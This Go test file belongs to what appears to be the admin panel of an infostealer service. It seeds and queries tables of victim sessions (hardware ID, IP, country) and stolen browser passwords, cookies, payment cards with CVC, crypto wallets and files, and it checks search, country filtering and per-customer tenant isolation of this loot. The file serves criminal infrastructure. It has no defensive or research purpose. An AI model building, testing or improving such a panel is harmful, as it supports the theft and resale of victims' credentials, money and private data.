package api_test

import (
	"database/sql"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"zialfi-panel/internal/api"
	"zialfi-panel/internal/auth"
	"zialfi-panel/internal/db"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
)

type dataEnvelope struct {
	Items []map[string]any `json:"items"`
	Total int              `json:"total"`
	Page  int              `json:"page"`
	Limit int              `json:"limit"`
	Pages int              `json:"pages"`
}

// seedDataRow inserts a session + one password/cookie/card/wallet/file row.
func seedDataRow(t *testing.T, d *sql.DB, sessionID, ownerID string) {
	t.Helper()
	if _, err := d.Exec(
		`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, owner_id, created_at)
		 VALUES (?, 'b', 'h', 'win', 'u', '1.2.3.4', 'US', ?, datetime('now'))`,
		sessionID, ownerID,
	); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec(
		`INSERT INTO passwords (id, session_id, url, username, password_value, browser) VALUES (?, ?, ?, ?, ?, ?)`,
		"p-"+sessionID, sessionID, "https://example.com/login", "alice", "hunter2", "chrome",
	); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec(
		`INSERT INTO cookies (id, session_id, domain, name, value, path) VALUES (?, ?, ?, ?, ?, ?)`,
		"ck-"+sessionID, sessionID, ".example.com", "session", "abc123", "/",
	); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec(
		`INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder, cvc) VALUES (?, ?, ?, ?, ?, ?, ?)`,
		"cd-"+sessionID, sessionID, "4532015112830366", "12", "2028", "ALICE DOE", "123",
	); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec(
		`INSERT INTO wallets (id, session_id, name, path) VALUES (?, ?, ?, ?)`,
		"w-"+sessionID, sessionID, "MetaMask", "C:\\Users\\alice\\AppData\\Roaming\\MetaMask",
	); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec(
		`INSERT INTO stolen_files (id, session_id, filename, size) VALUES (?, ?, ?, ?)`,
		"f-"+sessionID, sessionID, "passwords.txt", 2048,
	); err != nil {
		t.Fatal(err)
	}
}

func dataGet(t *testing.T, r http.Handler, token, url string) (int, dataEnvelope) {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, url, nil)
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	var env dataEnvelope
	if w.Code == http.StatusOK {
		if err := json.Unmarshal(w.Body.Bytes(), &env); err != nil {
			t.Fatalf("bad JSON: %v", err)
		}
	}
	return w.Code, env
}

func TestData_Passwords_HappyPath(t *testing.T) {
	d := openTestDB(t)
	r, token, _ := setupE2ETestRouter(t, d, nil)
	sid := uuid.New().String()
	seedDataRow(t, d, sid, "")

	code, env := dataGet(t, r, token, "/api/data/passwords?page=1&limit=10")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 1 || len(env.Items) != 1 {
		t.Fatalf("total=%d items=%d, want 1/1", env.Total, len(env.Items))
	}
	it := env.Items[0]
	if it["url"] != "https://example.com/login" {
		t.Errorf("url = %v", it["url"])
	}
	if it["password_value"] != "hunter2" {
		t.Errorf("password_value = %v", it["password_value"])
	}
	if it["country_code"] != "US" {
		t.Errorf("country_code = %v", it["country_code"])
	}
	if it["session_id"] != sid {
		t.Errorf("session_id = %v, want %s", it["session_id"], sid)
	}
}

func TestData_Cookies_HappyPath(t *testing.T) {
	d := openTestDB(t)
	r, token, _ := setupE2ETestRouter(t, d, nil)
	sid := uuid.New().String()
	seedDataRow(t, d, sid, "")

	code, env := dataGet(t, r, token, "/api/data/cookies")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 1 || len(env.Items) != 1 {
		t.Fatalf("total=%d items=%d", env.Total, len(env.Items))
	}
	it := env.Items[0]
	if it["domain"] != ".example.com" || it["value"] != "abc123" {
		t.Errorf("domain/value = %v/%v", it["domain"], it["value"])
	}
}

func TestData_Cards_HappyPath(t *testing.T) {
	d := openTestDB(t)
	r, token, _ := setupE2ETestRouter(t, d, nil)
	sid := uuid.New().String()
	seedDataRow(t, d, sid, "")

	code, env := dataGet(t, r, token, "/api/data/cards")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 1 {
		t.Fatalf("total=%d, want 1", env.Total)
	}
	it := env.Items[0]
	if it["holder"] != "ALICE DOE" {
		t.Errorf("holder = %v", it["holder"])
	}
	if it["number"] != "4532015112830366" {
		t.Errorf("number = %v", it["number"])
	}
}

func TestData_Wallets_HappyPath(t *testing.T) {
	d := openTestDB(t)
	r, token, _ := setupE2ETestRouter(t, d, nil)
	sid := uuid.New().String()
	seedDataRow(t, d, sid, "")

	code, env := dataGet(t, r, token, "/api/data/wallets")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 1 || env.Items[0]["name"] != "MetaMask" {
		t.Fatalf("wallets total=%d name=%v", env.Total, env.Items[0]["name"])
	}
}

func TestData_Files_HappyPath(t *testing.T) {
	d := openTestDB(t)
	r, token, _ := setupE2ETestRouter(t, d, nil)
	sid := uuid.New().String()
	seedDataRow(t, d, sid, "")

	code, env := dataGet(t, r, token, "/api/data/files")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 1 || env.Items[0]["filename"] != "passwords.txt" {
		t.Fatalf("files total=%d filename=%v", env.Total, env.Items[0]["filename"])
	}
	if env.Items[0]["size"] != float64(2048) {
		t.Errorf("size = %v", env.Items[0]["size"])
	}
}

func TestData_Search(t *testing.T) {
	d := openTestDB(t)
	r, token, _ := setupE2ETestRouter(t, d, nil)
	seedDataRow(t, d, uuid.New().String(), "")
	seedDataRow(t, d, uuid.New().String(), "")

	code, env := dataGet(t, r, token, "/api/data/passwords?q=alice")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 2 {
		t.Errorf("q=alice total=%d, want 2", env.Total)
	}

	code, env = dataGet(t, r, token, "/api/data/passwords?q=nomatchzzz")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 0 || len(env.Items) != 0 {
		t.Errorf("q=nomatch total=%d items=%d, want 0/0", env.Total, len(env.Items))
	}
}

func TestData_CountryFilter(t *testing.T) {
	d := openTestDB(t)
	r, token, _ := setupE2ETestRouter(t, d, nil)
	seedDataRow(t, d, uuid.New().String(), "")

	code, env := dataGet(t, r, token, "/api/data/cookies?country=DE")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 0 {
		t.Errorf("country=DE total=%d, want 0 (seeded US)", env.Total)
	}

	code, env = dataGet(t, r, token, "/api/data/cookies?country=US")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 1 {
		t.Errorf("country=US total=%d, want 1", env.Total)
	}
}

func TestData_Pagination(t *testing.T) {
	d := openTestDB(t)
	r, token, _ := setupE2ETestRouter(t, d, nil)
	for i := 0; i < 3; i++ {
		seedDataRow(t, d, uuid.New().String(), "")
	}

	code, env := dataGet(t, r, token, "/api/data/passwords?page=1&limit=2")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 3 || len(env.Items) != 2 || env.Pages != 2 {
		t.Errorf("page1: total=%d items=%d pages=%d, want 3/2/2", env.Total, len(env.Items), env.Pages)
	}

	code, env = dataGet(t, r, token, "/api/data/passwords?page=2&limit=2")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if len(env.Items) != 1 || env.Page != 2 {
		t.Errorf("page2: items=%d page=%d, want 1/2", len(env.Items), env.Page)
	}
}

func TestData_UnknownType(t *testing.T) {
	d := openTestDB(t)
	r, token, _ := setupE2ETestRouter(t, d, nil)
	req := httptest.NewRequest(http.MethodGet, "/api/data/bogus", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusNotFound {
		t.Fatalf("code=%d, want 404", w.Code)
	}
}

func TestData_RequiresAuth(t *testing.T) {
	d := openTestDB(t)
	r, _, _ := setupE2ETestRouter(t, d, nil)
	req := httptest.NewRequest(http.MethodGet, "/api/data/passwords", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("code=%d, want 401", w.Code)
	}
}

func TestData_TenantScope_NonAdminSeesOwnOnly(t *testing.T) {
	d := openTestDB(t)
	r := chi.NewRouter()
	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, db.ProviderSQLite, nil)

	userA := createTestUserWithRole(t, d, "usera", "pw", "user")
	userB := createTestUserWithRole(t, d, "userb", "pw", "user")

	seedDataRow(t, d, uuid.New().String(), userA)
	seedDataRow(t, d, uuid.New().String(), userB)

	tokenA, _, err := auth.GenerateToken(userA, "user", "test-secret", "")
	if err != nil {
		t.Fatal(err)
	}

	code, env := dataGet(t, r, tokenA, "/api/data/passwords")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 1 {
		t.Errorf("userA sees %d rows, want 1 (own only)", env.Total)
	}
}

func TestData_AdminSeesAll(t *testing.T) {
	d := openTestDB(t)
	r := chi.NewRouter()
	api.SetupRoutes(r, d, "test-secret", "*", nil, nil, nil, db.ProviderSQLite, nil)

	userA := createTestUserWithRole(t, d, "usera", "pw", "user")
	adminID := createTestUserWithRole(t, d, "root", "pw", "admin")

	seedDataRow(t, d, uuid.New().String(), userA)

	token, _, err := auth.GenerateToken(adminID, "admin", "test-secret", "")
	if err != nil {
		t.Fatal(err)
	}
	code, env := dataGet(t, r, token, "/api/data/wallets")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 1 {
		t.Errorf("admin sees %d rows, want 1 (all tenants)", env.Total)
	}
}

func TestData_Sort(t *testing.T) {
	d := openTestDB(t)
	r, token, _ := setupE2ETestRouter(t, d, nil)
	seedDataRow(t, d, uuid.New().String(), "")
	seedDataRow(t, d, uuid.New().String(), "")

	code, env := dataGet(t, r, token, "/api/data/passwords?sort=url")
	if code != http.StatusOK {
		t.Fatalf("GET failed: %d", code)
	}
	if env.Total != 2 {
		t.Errorf("sort total=%d, want 2", env.Total)
	}
}
